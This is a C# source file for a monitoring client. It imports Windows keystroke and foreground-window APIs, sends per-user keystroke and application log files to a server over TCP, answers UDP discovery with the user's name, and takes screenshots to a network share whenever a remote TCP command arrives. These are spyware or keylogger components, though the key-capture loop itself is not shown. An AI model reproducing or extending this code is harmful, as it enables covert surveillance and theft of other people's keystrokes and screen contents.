using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using SimpleTCP;

namespace DllIm
{
    class ClientTools
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        public ClientTools()
        {

        }
        public static void sendFileApp()
        {
            TcpClient client = new TcpClient();
            Stream stream;
            string filename = Environment.UserName+"App.lab";
            string filepath = @"\\PAPA-ROMEO\Testing\Client\" + filename;
            FileStream fs =null;
            try
            {
                fs = File.Open(filepath, FileMode.Open);
                client.Connect("127.0.0.1", 12220);
                stream = client.GetStream();
                byte[] outStream = System.Text.Encoding.ASCII.GetBytes(filename );
                stream.Write(outStream, 0, outStream.Length);
                stream.Flush();
                int data = fs.ReadByte();
                while (data != -1)
                {
                    stream.WriteByte((byte)data);
                    data = fs.ReadByte();
                }
                fs.Close();
                stream.Close();
            }
            catch (Exception ex)
            {
                ClientTools pro = new ClientTools();
                pro.ErrorLog(ex.ToString());
                fs.Close();
                //stream.Close();
                client.Close();
            }
        }
        public static void sendFileKeyStroke()
        {
            TcpClient client = new TcpClient();
            Stream stream;
            string filename = Environment.UserName + "KeyStroke.lab";
            string filepath = @"\\PAPA-ROMEO\Testing\Client\" + filename;
            FileStream fs = null;
            try
            {
                fs = File.Open(filepath, FileMode.Open);
                client.Connect("127.0.0.1", 12221);
                stream = client.GetStream();
                byte[] outStream = System.Text.Encoding.ASCII.GetBytes(filename);
                stream.Write(outStream, 0, outStream.Length);
                stream.Flush();
                int data = fs.ReadByte();
                while (data != -1)
                {
                    stream.WriteByte((byte)data);
                    data = fs.ReadByte();
                }
                fs.Close();
                stream.Close();
            }
            catch (Exception ex)
            {
                ClientTools pro = new ClientTools();
                pro.ErrorLog(ex.ToString());
                fs.Close();
                //stream.Close();
                client.Close();
            }
        }
        private void ErrorLog(string error)
        {
            StreamWriter sw = new StreamWriter(@"\\PAPA-ROMEO\Testing\Error.txt", true);
            sw.WriteLine(DateTime.Now.ToString() + "  " + error + "\n");
            sw.Close();
        }
        public static void broadcastreply()
        {
            var server = new UdpClient(1000);
            while (true)
            {
                var ClientEP = new IPEndPoint(IPAddress.Any, 0);
                var clientrequestdata = server.Receive(ref ClientEP);
                var clientrequest = Encoding.ASCII.GetString(clientrequestdata);
                Console.WriteLine("Recived {0} from {1}, sending response", clientrequest, ClientEP.Address.ToString());
                if (clientrequest != null)
                    SendResponse(server, ClientEP);
            }
        }
        public static void SendResponse(UdpClient server, IPEndPoint ClientEP)
        {
            string clientInformation = String.Format(Environment.UserName);
            var responsedata = Encoding.ASCII.GetBytes(clientInformation);
            server.Send(responsedata, responsedata.Length, ClientEP);
        }
        
        public static void Capture_Screen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            //MessageBox.Show(bounds.ToString());
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
            Graphics g = Graphics.FromImage(bitmap);
            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            bitmap.Save(@"\\PAPA-ROMEO\Testing\" + Environment.UserName.ToString() + System.DateTime.Now.ToString("yyyyMMdd_HHMMss") + ".jpg", ImageFormat.Jpeg);
        }
        //public static void Listener()
        //{
        //    try
        //    {
        //        MessageBox.Show("Listener Started:");
        //        TcpListener SingnalListener = null;
        //        // Set the TcpListener on port 13000.
        //        Int32 port = 7895;
        //        IPAddress localAddr = IPAddress.Parse("127.0.0.1");

        //        // TcpListener server = new TcpListener(port);
        //        SingnalListener = new TcpListener(localAddr, port);

        //        // Start listening for client requests.
        //        SingnalListener.Start();

        //        // Buffer for reading data
        //        Byte[] bytes = new Byte[256];
        //        String data = null;

        //        // Enter the listening loop.
        //        while (true)
        //        {
        //            // Perform a blocking call to accept requests.
        //            // You could also user server.AcceptSocket() here.
        //            TcpClient client = SingnalListener.AcceptTcpClient();

        //            data = null;

        //            // Get a stream object for reading and writing
        //            NetworkStream stream = client.GetStream();

        //            int i;

        //            // Loop to receive all the data sent by the client.
        //            while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
        //            {
        //                MessageBox.Show("Daata Recevied");
        //                // Translate data bytes to a ASCII string.
        //                data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);

        //                // Process the data sent by the client.
        //                data = data.ToUpper();

        //                byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

        //                // Send back a response.
        //                stream.Write(msg, 0, msg.Length);
        //            }

        //            // Shutdown and end connection
        //            client.Close();
        //        }
        //    }
        //    catch (SocketException e)
        //    {
        //    }
        //    finally
        //    {
        //    }
        //}


        public static void Listener()
        {
            UdpClient Client = new UdpClient();
            var ServerEp = new IPEndPoint(IPAddress.Any, 7895);
            try
            {
                while (true)
                {
                    var ServerResponseData = Client.Receive(ref ServerEp);
                    string signal= Encoding.ASCII.GetString(ServerResponseData);
                    MessageBox.Show(signal);
                }
            }
            catch (Exception ex)
            {
            }
        }
        static SimpleTcpServer server;
        public static void tcpServer()
        {
            server = new SimpleTcpServer();
            server.Delimiter=0x13;
            server.StringEncoder = Encoding.UTF8;
            var host = Dns.GetHostEntry("Papa-Romeo");
            var ipaddress = host.AddressList[6];
            server.Start(ipaddress,51817);
            server.DataReceived += server_DataReceived;
        }

        static void server_DataReceived(object sender, SimpleTCP.Message e)
        {
            if (! string.IsNullOrEmpty( e.MessageString))
            {
                ClientTools.Capture_Screen();
                server.BroadcastLine("captured");
                //MessageBox.Show(e.MessageString);

            }

        }
    }
}
